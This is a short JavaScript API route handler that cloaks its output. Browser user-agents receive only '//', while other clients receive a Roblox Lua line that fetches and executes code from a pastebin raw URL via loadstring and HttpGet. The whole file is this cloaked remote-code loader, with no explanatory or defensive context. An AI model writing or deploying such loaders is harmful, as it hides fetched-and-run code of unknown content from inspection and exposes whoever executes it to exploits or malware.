export default function handler(req, res) {
  const b = req.headers["user-agent"]?.includes("Mozilla")
  if (b) return res.status(200).send("//")
  res.status(200).send(`
loadstring(game:HttpGet("https://pastebin.com/raw/G88Gh4B"))()
  `)
                       }
